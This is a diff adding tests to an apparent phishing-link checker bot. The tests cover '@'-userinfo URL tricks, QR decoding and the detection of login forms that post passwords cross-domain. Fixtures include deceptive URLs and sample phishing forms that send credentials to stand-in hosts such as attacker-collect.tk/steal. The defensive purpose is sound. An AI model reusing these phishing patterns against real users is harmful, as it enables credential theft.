@@ -19,6 +19,7 @@ from bot.url_checker.features.lexical import (
     extract_urls,
     registered_domain,
 )
+from bot.url_checker.features.qr_decode import decode_qr
 
 
 # --- lexical analyzer (existing behaviour, still intact) ---------------
@@ -27,6 +28,33 @@ def test_extract_urls_finds_bare_and_full_links():
     urls = extract_urls("see https://ababank.com or bit.ly/x9 and mail me")
     assert any("ababank.com" in u for u in urls)
     assert any("bit.ly" in u for u in urls)
+
+
+def test_extract_urls_preserves_userinfo_credential_trick():
+    # Regression: extract_urls() used to silently truncate past '@'
+    # (treating it as pure URL syntax), handing check_url() only the
+    # real destination and losing the exact evidence its own '@'
+    # check depends on - making that check permanently unreachable via
+    # normal message scanning. The classic trick: a real-looking brand
+    # domain before '@', the actual destination after it.
+    urls = extract_urls("go to real-bank.com@evil-site.tk now")
+    assert urls == ["real-bank.com@evil-site.tk"]  # one match, not truncated to "evil-site.tk"
+
+    v = check_url(urls[0])
+    assert v["host"] == "evil-site.tk"  # that's genuinely where a click would land
+    assert any("trick to hide the real destination" in r for r in v["reasons"])
+
+
+def test_extract_urls_userinfo_trick_works_bare_too():
+    # No scheme, no path - still must not be silently dropped, since
+    # extract_urls() already treats bare domains as checkable links
+    # elsewhere; "abab@nk.com" also happens to de-leet to
+    # "ababank.com" ('@' -> 'a'), a second, independent red flag on
+    # top of the '@' trick itself.
+    urls = extract_urls("abab@nk.com")
+    assert urls == ["abab@nk.com"]
+    v = check_url(urls[0])
+    assert v["level"] != "safe"
 
 
 def test_check_url_flags_raw_ip():
@@ -163,7 +191,67 @@ def test_extract_page_text_strips_scripts():
     assert "evil()" not in text
 
 
+# --- form/password field detection -----------------------------------------
+
+def test_has_password_field_detects_login_form():
+    html = '<form><input type="text" name="u"><input type="password" name="p"></form>'
+    assert network.has_password_field(html)
+
+
+def test_has_password_field_false_when_absent():
+    assert not network.has_password_field("<form><input type='text'></form>")
+
+
+def test_find_form_actions_extracts_targets():
+    html = '<form action="https://attacker.tk/steal"></form><form action="/login"></form>'
+    assert network.find_form_actions(html) == ["https://attacker.tk/steal", "/login"]
+
+
+# --- QR code decoding -------------------------------------------------
+
+def test_decode_qr_reads_a_real_generated_code():
+    import io
+    import qrcode
+
+    img = qrcode.make("http://free-prize-winner.tk/claim")
+    buf = io.BytesIO()
+    img.save(buf, format="PNG")
+
+    assert decode_qr(buf.getvalue()) == "http://free-prize-winner.tk/claim"
+
+
+def test_decode_qr_returns_none_for_non_qr_image():
+    import io
+    from PIL import Image
+
+    img = Image.new("RGB", (50, 50), color="white")
+    buf = io.BytesIO()
+    img.save(buf, format="PNG")
+
+    assert decode_qr(buf.getvalue()) is None
+
+
+def test_decode_qr_never_crashes_on_garbage_bytes():
+    assert decode_qr(b"not an image at all") is None
+    assert decode_qr(b"") is None
+
+
 # --- orchestrator merge logic (network faked) -----------------------------
+
+@pytest.fixture(autouse=True)
+def _no_real_tls_handshakes(monkeypatch):
+    """cert_issued_days_ago does a REAL TLS handshake (ssl/socket, up to
+    an 8s timeout per unresolvable host) - autouse so every test in this
+    file gets a fast, deterministic stub without each one needing to
+    remember it, the same way domain_age_days/resolve_host are stubbed
+    per-test below. Individual tests can still override this via their
+    own monkeypatch.setattr if they specifically want to test cert-age
+    scoring.
+    """
+    async def fake_cert_age(host, port=443):
+        return None
+    monkeypatch.setattr(pipeline, "cert_issued_days_ago", fake_cert_age)
+
 
 class _FakeNet:
     def __init__(self, **overrides):
@@ -215,6 +303,69 @@ def _stub_out_network(monkeypatch, tls_valid=True):
     monkeypatch.setattr(pipeline.network, "trace", fake_trace)
     monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
     monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)
+
+
+def test_analyze_url_flags_cross_domain_credential_exfiltration(seeded_vectors, monkeypatch):
+    # The actual "form action inspection" case: a login form that's
+    # visually on the scanned page but POSTs the password somewhere
+    # else entirely - the pattern a fake login page needs to work.
+    fake = _FakeNet(
+        reachable=True, status=200, tls_valid=True,
+        final_url="http://ababank-login.tk/",
+        page_html='<form action="https://attacker-collect.tk/steal" method="post">'
+                   '<input type="password" name="pass"></form>',
+        page_text="please enter your password to continue",
+    )
+
+    async def fake_trace(url):
+        return fake.result
+
+    async def fake_age(host):
+        return None
+
+    async def fake_resolve(host):
+        return ["1.2.3.4"]
+
+    monkeypatch.setattr(pipeline.network, "trace", fake_trace)
+    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
+    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)
+    monkeypatch.setattr(pipeline, "VIRUSTOTAL_API_KEY", None)
+
+    verdict = asyncio.run(pipeline.analyze_url("http://ababank-login.tk/"))
+
+    assert any("credential-theft pattern" in r for r in verdict["reasons"])
+    assert any("attacker-collect.tk" in r for r in verdict["reasons"])
+
+
+def test_analyze_url_does_not_flag_same_origin_login_form(seeded_vectors, monkeypatch):
+    # A login form that submits back to its own page/domain is
+    # completely normal - must not be flagged just for existing.
+    fake = _FakeNet(
+        reachable=True, status=200, tls_valid=True,
+        final_url="https://www.some-real-shop.com/",
+        page_html='<form action="/login" method="post">'
+                   '<input type="password" name="pass"></form>'
+                   + ("Welcome to our shop. " * 30),  # clear the near-dup length gate
+        page_text="Welcome to our shop, please log in. " * 30,
+    )
+
+    async def fake_trace(url):
+        return fake.result
+
+    async def fake_age(host):
+        return 900
+
+    async def fake_resolve(host):
+        return ["1.2.3.4"]
+
+    monkeypatch.setattr(pipeline.network, "trace", fake_trace)
+    monkeypatch.setattr(pipeline, "domain_age_days", fake_age)
+    monkeypatch.setattr(pipeline, "resolve_host", fake_resolve)
+    monkeypatch.setattr(pipeline, "VIRUSTOTAL_API_KEY", None)
+
+    verdict = asyncio.run(pipeline.analyze_url("https://www.some-real-shop.com/"))
+
+    assert not any("credential-theft pattern" in r for r in verdict["reasons"])
 
 
 def test_check_message_full_sees_link_hidden_entirely_behind_entity_text(seeded_vectors, monkeypatch):
